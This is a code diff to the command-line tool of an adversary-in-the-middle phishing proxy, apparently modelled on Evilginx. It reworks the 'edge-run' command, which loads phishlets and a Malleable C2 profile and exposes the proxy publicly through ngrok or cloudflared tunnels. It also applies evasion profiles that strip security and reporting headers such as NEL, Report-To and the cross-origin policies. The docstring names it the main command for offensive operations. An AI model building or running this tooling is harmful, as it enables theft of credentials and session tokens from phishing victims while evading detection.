@@ -762,171 +762,70 @@ def edge_preset(host, port):
         console.print(f"[red]Edge preset unavailable: {e}[/red]")
         console.print("[blue]Install optional dependency: mitmproxy[/blue]")
 
+from core.cli.profiles import apply_profile
+from core.malleable.profile import load_malleable_profile
+
 @cli.command("edge-run")
-@click.option("--name", help="Nom du phishlet dans ./phishlets (sans .yaml)")
-@click.option("--path", help="Chemin vers un phishlet YAML")
-@click.option("--host", default="0.0.0.0")
-@click.option("--port", default=8443, type=int)
-@click.option("--tunnel", help="Créer un tunnel WAN (ngrok|cloudflared|localhost.run)", required=False)
-@click.option("--upstream", help="Proxy HTTP amont ex: http://user:pass@host:3128")
-@click.option("--rate", type=int, help="Limite de requêtes par minute par IP")
-@click.option("--allow-ips", help="Liste CSV d'IPs autorisées")
-@click.option("--deny-ips", help="Liste CSV d'IPs refusées")
-@click.option("--http2/--no-http2", default=True, help="Activer HTTP/2 (par défaut)")
-@click.option("--conn-strategy", default="lazy", help="Stratégie de connexion mitmproxy (lazy|eager)")
-@click.option("--profile", default="default", help="Profil (default|stealth|strict|perf|parano)")
-def edge_run(name, path, host, port, tunnel, upstream, rate, allow_ips, deny_ips, http2, conn_strategy, profile):
+@click.option("--name", help="Name of the phishlet in ./phishlets (without .yaml)", required=True)
+@click.option("--tunnel", help="Create a WAN tunnel (ngrok|cloudflared|localhost.run)", required=False)
+@click.option("--profile", default="default", help="Profile (default|stealth|strict|parano)")
+@click.option("--malleable-profile", default="default", help="Malleable C2 profile to use")
+@click.option("--host", default="0.0.0.0", help="Host to listen on", show_default=True)
+@click.option("--port", default=8443, type=int, help="Port to listen on", show_default=True)
+@click.option("--allow-ips", help="CSV list of allowed IPs")
+@click.option("--deny-ips", help="CSV list of denied IPs")
+def edge_run(name, tunnel, profile, malleable_profile, host, port, allow_ips, deny_ips):
+    """
+    Launches the AiTM proxy with a specific phishlet and profile.
+    This is the main command for offensive operations.
+    """
     try:
+        # Load the Malleable C2 profile first, so it's available globally
+        load_malleable_profile(malleable_profile)
+
         from core.edge.proxy import EdgeProxy, EdgeConfig
         import asyncio
-        import yaml
-        if not path and name:
-            path = os.path.join("phishlets", f"{name}.yaml")
-        if not path:
-            console.print("[red]Spécifie --name ou --path[/red]")
+
+        phishlet_path = os.path.join("phishlets", f"{name}.yaml")
+        if not os.path.exists(phishlet_path):
+            console.print(f"[red]Phishlet '{name}' not found at '{phishlet_path}'[/red]")
             return
-        with open(path, "r") as f:
-            ph_yaml = f.read()
-        # Appliquer profil
-        p = (profile or "default").lower()
-        _profile_http2 = None
-        if p == "stealth":
-            try:
-                data = yaml.safe_load(ph_yaml)
-                if not isinstance(data, dict):
-                    raise ValueError("phishlet YAML invalide")
-                # Blocklist agressive
-                bl = data.get("blocklist") or []
-                extra_bl = [
-                    {"pattern": "analytics|gtm|/metrics|/collect", "mimes": ["text/javascript","application/javascript"], "max_kb": 512},
-                    {"pattern": "/fonts/|/woff2|/ttf", "mimes": ["font/"], "max_kb": 256},
-                    {"pattern": "/video|/media", "mimes": ["video/"], "max_kb": 1024},
-                    {"pattern": "/images|/img|/static/", "mimes": ["image/"], "max_kb": 300},
-                ]
-                bl.extend(extra_bl)
-                data["blocklist"] = bl
-                # En-têtes: retirer NEL/Report-To si présents
-                hdrs = data.get("headers") or []
-                hdrs.extend([
-                    {"action": "remove", "name": "NEL"},
-                    {"action": "remove", "name": "Report-To"},
-                ])
-                data["headers"] = hdrs
-                ph_yaml = yaml.safe_dump(data, sort_keys=False)
-                # Réseau par défaut stealth si non surchargé
-                if rate is None:
-                    os.environ["RATE_LIMIT_PER_MINUTE"] = "60"
-            except Exception as e:
-                console.print(f"[yellow]Profil stealth non appliqué: {e}[/yellow]")
-        elif p == "strict":
-            try:
-                data = yaml.safe_load(ph_yaml)
-                if not isinstance(data, dict):
-                    raise ValueError("phishlet YAML invalide")
-                bl = data.get("blocklist") or []
-                extra_bl = [
-                    {"pattern": "analytics|gtm|beacon|/collect|/measure", "mimes": ["text/javascript","application/javascript"], "max_kb": 256},
-                    {"pattern": "/fonts/|/woff2|/ttf", "mimes": ["font/"], "max_kb": 160},
-                    {"pattern": "/video|/media|/stream", "mimes": ["video/"], "max_kb": 400},
-                    {"pattern": "/images|/img|/static/", "mimes": ["image/"], "max_kb": 150},
-                ]
-                bl.extend(extra_bl)
-                data["blocklist"] = bl
-                # En-têtes à retirer
-                hdrs = data.get("headers") or []
-                hdrs.extend([
-                    {"action": "remove", "name": "NEL"},
-                    {"action": "remove", "name": "Report-To"},
-                    {"action": "remove", "name": "Cross-Origin-Opener-Policy"},
-                    {"action": "remove", "name": "Cross-Origin-Embedder-Policy"},
-                    {"action": "remove", "name": "Cross-Origin-Resource-Policy"},
-                    {"action": "remove", "name": "Permissions-Policy"},
-                ])
-                data["headers"] = hdrs
-                ph_yaml = yaml.safe_dump(data, sort_keys=False)
-                # HTTP/2 off et limite plus basse
-                _profile_http2 = False
-                if rate is None:
-                    os.environ["RATE_LIMIT_PER_MINUTE"] = "40"
-            except Exception as e:
-                console.print(f"[yellow]Profil strict non appliqué: {e}[/yellow]")
-        elif p == "perf":
-            try:
-                data = yaml.safe_load(ph_yaml)
-                if not isinstance(data, dict):
-                    raise ValueError("phishlet YAML invalide")
-                bl = data.get("blocklist") or []
-                extra_bl = [
-                    {"pattern": "analytics|gtm", "mimes": ["text/javascript","application/javascript"], "max_kb": 1024},
-                ]
-                bl.extend(extra_bl)
-                data["blocklist"] = bl
-                hdrs = data.get("headers") or []
-                hdrs.extend([
-                    {"action": "remove", "name": "NEL"},
-                    {"action": "remove", "name": "Report-To"},
-                ])
-                data["headers"] = hdrs
-                ph_yaml = yaml.safe_dump(data, sort_keys=False)
-                if rate is None:
-                    os.environ["RATE_LIMIT_PER_MINUTE"] = "100"
-            except Exception as e:
-                console.print(f"[yellow]Profil perf non appliqué: {e}[/yellow]")
-        elif p == "parano":
-            try:
-                data = yaml.safe_load(ph_yaml)
-                if not isinstance(data, dict):
-                    raise ValueError("phishlet YAML invalide")
-                bl = data.get("blocklist") or []
-                extra_bl = [
-                    {"pattern": ".*", "mimes": ["video/"], "max_kb": 1},
-                    {"pattern": ".*", "mimes": ["image/"], "max_kb": 120},
-                    {"pattern": "fonts?|woff2|ttf", "mimes": ["font/"], "max_kb": 120},
-                    {"pattern": "analytics|gtm|beacon|/collect|/measure", "mimes": ["text/javascript","application/javascript"], "max_kb": 180},
-                ]
-                bl.extend(extra_bl)
-                data["blocklist"] = bl
-                hdrs = data.get("headers") or []
-                hdrs.extend([
-                    {"action": "remove", "name": "NEL"},
-                    {"action": "remove", "name": "Report-To"},
-                    {"action": "remove", "name": "Cross-Origin-Opener-Policy"},
-                    {"action": "remove", "name": "Cross-Origin-Embedder-Policy"},
-                    {"action": "remove", "name": "Cross-Origin-Resource-Policy"},
-                    {"action": "remove", "name": "Permissions-Policy"},
-                ])
-                data["headers"] = hdrs
-                ph_yaml = yaml.safe_dump(data, sort_keys=False)
-                _profile_http2 = False
-                if rate is None:
-                    os.environ["RATE_LIMIT_PER_MINUTE"] = "30"
-            except Exception as e:
-                console.print(f"[yellow]Profil parano non appliqué: {e}[/yellow]")
-        # Environnement réseau
-        if rate is not None:
-            os.environ["RATE_LIMIT_PER_MINUTE"] = str(rate)
-        if allow_ips is not None:
+
+        with open(phishlet_path, "r") as f:
+            original_phishlet_yaml = f.read()
+
+        # Prepare CLI options for the profile application
+        cli_options = {
+            'rate': None, # Let profile handle it
+            'http2': True # Default value
+        }
+
+        # Apply the selected profile
+        modified_phishlet_yaml, updated_options = apply_profile(
+            profile, original_phishlet_yaml, cli_options
+        )
+
+        # Set environment variables for network settings
+        if allow_ips:
             os.environ["ALLOW_IPS"] = allow_ips
-        if deny_ips is not None:
+        if deny_ips:
             os.environ["DENY_IPS"] = deny_ips
+
+        # Configure and start the proxy
         cfg = EdgeConfig(listen_host=host, listen_port=port)
-        cfg.http2 = bool(http2) if _profile_http2 is None else bool(_profile_http2)
-        cfg.connection_strategy = conn_strategy
-        if upstream:
-            cfg.upstream_http = upstream
+        cfg.http2 = updated_options.get('http2', True)
+        
         proxy = EdgeProxy(cfg)
         
-        # WAN / Remote Access Info
+        # Handle WAN tunnel if requested
         if tunnel:
             from core.net.tunnel import TunnelManager
-            provider = tunnel if isinstance(tunnel, str) else "cloudflared"
-            tm = TunnelManager(port=port, provider=provider)
-            console.print(f"[yellow]Initialisation du tunnel WAN ({provider})...[/yellow]")
+            tm = TunnelManager(port=port, provider=tunnel)
+            console.print(f"[yellow]Initializing WAN tunnel ({tunnel})...[/yellow]")
             try:
                 public_url = asyncio.run(tm.start())
-                console.print(f"[green]Tunnel Actif:[/green] {public_url}")
+                console.print(f"[green]Tunnel Active:[/green] {public_url}")
                 os.environ["VANTA_PUBLIC_URL"] = public_url
-                # Also clean the URL to get just the hostname for the interceptor
                 if "://" in public_url:
                     os.environ["VANTA_PUBLIC_HOST"] = public_url.split("://")[1].split("/")[0]
             except Exception as e:
@@ -934,11 +833,12 @@ def edge_run(name, path, host, port, tunnel, upstream, rate, allow_ips, deny_ips
         else:
             print_wan_info(port)
 
-        console.print(f"[yellow]Starting Edge with {path}[/yellow]")
-        asyncio.run(proxy.start(ph_yaml))
+        console.print(f"[yellow]Starting Edge with phishlet '{name}', profile '{profile}', and malleable profile '{malleable_profile}'[/yellow]")
+        asyncio.run(proxy.start(modified_phishlet_yaml))
+
     except Exception as e:
-        console.print(f"[red]Erreur: {e}[/red]")
-        console.print("[blue]Install optional dependency: mitmproxy[/blue]")
+        console.print(f"[red]An error occurred: {e}[/red]")
+        console.print("[blue]Ensure 'mitmproxy' is installed (pip install mitmproxy)[/blue]")
 
 @cli.command("phishlets-list")
 def phishlets_list():
